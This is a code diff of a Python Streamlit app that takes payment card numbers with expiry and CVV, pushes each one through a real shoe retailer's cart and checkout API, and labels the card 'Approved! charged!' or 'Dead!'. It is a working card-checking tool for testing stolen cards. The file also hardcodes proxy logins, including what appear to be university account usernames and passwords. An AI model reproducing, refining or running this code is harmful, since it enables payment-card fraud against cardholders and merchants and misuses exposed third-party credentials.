@@ -34,37 +34,29 @@ def find_between(data, first, last):
 # Function to perform automated tasks
 @st.cache(allow_output_mutation=True, suppress_st_warning=True)
 def automate_tasks(card_num):
-    email = generate_password()[0]
-    password = generate_password()[1]
-    
-    username = generate_password()[2]
-    
-    # Get the card details from the user input
-    cc, mm, yy, cvv = card_num.strip().split("|")
-        # List of proxies
+    email, password, username = generate_password()
+
+    # List of proxies
     proxies = [
-    'auth-proxy.unipd.it:8080:matteo.pastrello@studenti.unipd.it:Thepastro333',
-    'auth-proxy.unipd.it:8080:gianmarco.favero.1@studenti.unipd.it:sossio1994',
-    'residential.pingproxies.com:10597:Z57wqOkavdy1cCT_c_US:RNW78Fm5'
+        'auth-proxy.unipd.it:8080:matteo.pastrello@studenti.unipd.it:Thepastro333',
+        'auth-proxy.unipd.it:8080:gianmarco.favero.1@studenti.unipd.it:sossio1994',
+        'residential.pingproxies.com:10597:Z57wqOkavdy1cCT_c_US:RNW78Fm5'
+    ]
 
-]
-
-        
-        # Create an iterator that cycles through the proxies
+    # Create an iterator that cycles through the proxies
     proxy_cycle = itertools.cycle(proxies)
-    
+
     # Initialize a requests session
     r = requests.Session()
     r.cookies.clear()
-    
+
     # Get the card details from the user input
     cc, mm, yy, cvv = card_num.strip().split("|")
- 
+
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.5',
-        # 'Accept-Encoding': 'gzip, deflate, br',
         'Alt-Used': 'burjushoes.com',
         'Connection': 'keep-alive',
         'Upgrade-Insecure-Requests': '1',
@@ -72,28 +64,23 @@ def automate_tasks(card_num):
         'Sec-Fetch-Mode': 'navigate',
         'Sec-Fetch-Site': 'none',
         'Sec-Fetch-User': '?1',
-        # Requests doesn't support trailers
-        # 'TE': 'trailers',
     }
 
-    response = r.get('https://burjushoes.com/diamond-dazzle-fishnet-body-stocking/',  headers=headers)
+    response = r.get('https://burjushoes.com/diamond-dazzle-fishnet-body-stocking/', headers=headers)
     cookies_1 = "; ".join([f"{key}={value}" for key, value in r.cookies.items()])
-
-    xsrf = urllib.parse.unquote(find_between(cookies_1, "XSRF-TOKEN=", ";"))# type: ignore
-
-    
+    xsrf = urllib.parse.unquote(find_between(cookies_1, "XSRF-TOKEN=", ";"))
 
     h2 = {
-                "Host": "burjushoes.com",
-                "origin": "https://burjushoes.com",
-                "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryqtFtTx3AkC77qfwp",
-                "accept": "*/*",
-                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
-                "referer": "https://burjushoes.com/diamond-dazzle-fishnet-body-stocking/",
-                "stencil-options": "{}",
-                "stencil-config": "{}",
-                "x-xsrf-token": f"{xsrf}",
-            }
+        "Host": "burjushoes.com",
+        "origin": "https://burjushoes.com",
+        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryqtFtTx3AkC77qfwp",
+        "accept": "*/*",
+        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+        "referer": "https://burjushoes.com/diamond-dazzle-fishnet-body-stocking/",
+        "stencil-options": "{}",
+        "stencil-config": "{}",
+        "x-xsrf-token": f"{xsrf}",
+    }
 
     p2 = """------WebKitFormBoundaryqtFtTx3AkC77qfwp
     Content-Disposition: form-data; name="action"
@@ -115,23 +102,21 @@ def automate_tasks(card_num):
     """
 
     r2 = r.post(
-                "https://burjushoes.com/remote/v1/cart/add",
-                headers=h2,
-                data=p2,
-            )
+        "https://burjushoes.com/remote/v1/cart/add",
+        headers=h2,
+        data=p2,
+    )
     t2 = r2.text
     cart_id = find_between(t2, '"cart_id":"', '"')
     id_ = find_between(t2, '"id":"', '"')
 
-
-
     h3 = {
-                "Host": "api.onrally.com",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
-                "Origin": "https://burjushoes.com",
-                "Content-Type": "application/json",
-                "Accept": "*/*",
-            }
+        "Host": "api.onrally.com",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+        "Origin": "https://burjushoes.com",
+        "Content-Type": "application/json",
+        "Accept": "*/*",
+    }
 
     c_time = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S%z")
 
@@ -250,16 +235,15 @@ def automate_tasks(card_num):
     t3 = r3.text
     ch = find_between(t3, '"checkout_session_id":"', '"')
 
-
     h4 = {
-                "Host": "api.onrally.com",
-                "X-Rally-Client-ID": "979a8081-ada4-4a19-99de-0864af46d7bf",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
-                "Accept": "application/json, text/plain, */*",
-                "X-Rally-Checkout-Session": f"{ch}",
-                "Origin": "https://checkout.burjushoes.com",
-                "Referer": "https://checkout.burjushoes.com/",
-            }
+        "Host": "api.onrally.com",
+        "X-Rally-Client-ID": "979a8081-ada4-4a19-99de-0864af46d7bf",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "X-Rally-Checkout-Session": f"{ch}",
+        "Origin": "https://checkout.burjushoes.com",
+        "Referer": "https://checkout.burjushoes.com/",
+    }
 
     r4 = r.get(
         f"https://api.onrally.com/api/v1/checkouts/{ch}",
@@ -267,9 +251,9 @@ def automate_tasks(card_num):
     )
 
     r5 = r.get(
-                f"https://api.onrally.com/api/v1/cart/{ch}?include=shipping_lines,selected_shipping_line_external_id",
-                headers=h4,
-            )
+        f"https://api.onrally.com/api/v1/cart/{ch}?include=shipping_lines,selected_shipping_line_external_id",
+        headers=h4,
+    )
 
     h6 = {
         "Host": "api.onrally.com",
@@ -320,7 +304,7 @@ def automate_tasks(card_num):
         headers=h6,
         json=p7,
     )
-    
+
     h8 = {
         "Host": "tntj5p9kfeq.live.verygoodproxy.com",
         "accept": "application/json, text/plain, */*",
@@ -367,7 +351,7 @@ def automate_tasks(card_num):
     )
     t9 = r9.text
     msg = find_between(t9, '"message":"', '"')
-    
+
     if r9.status_code == 302 or r9.status_code == 200:
         status = "Approved! ✅ -» charged!"
         msg = "Thanks -» $28.99"
@@ -384,9 +368,10 @@ def automate_tasks(card_num):
     else:
         status = "Dead! ❌"
 
-    print(f"{cc}|{mm}|{yy}|{cvv} ->" ,status, msg)
+    print(f"{cc}|{mm}|{yy}|{cvv} ->", status, msg)
 
-        # Input field for card details
+
+# Input field for card details
 card_num = st.text_input("Enter card number in format CC|MM|YY|CVV:")
 
 # Button to run automated tasks
@@ -395,7 +380,6 @@ if st.button("Run Automated Tasks"):
     automate_tasks(card_num)
     st.write("Automated tasks completed!")
 
-# Main function
 # Main function
 def main():
     st.title("Automated Tasks with Streamlit")
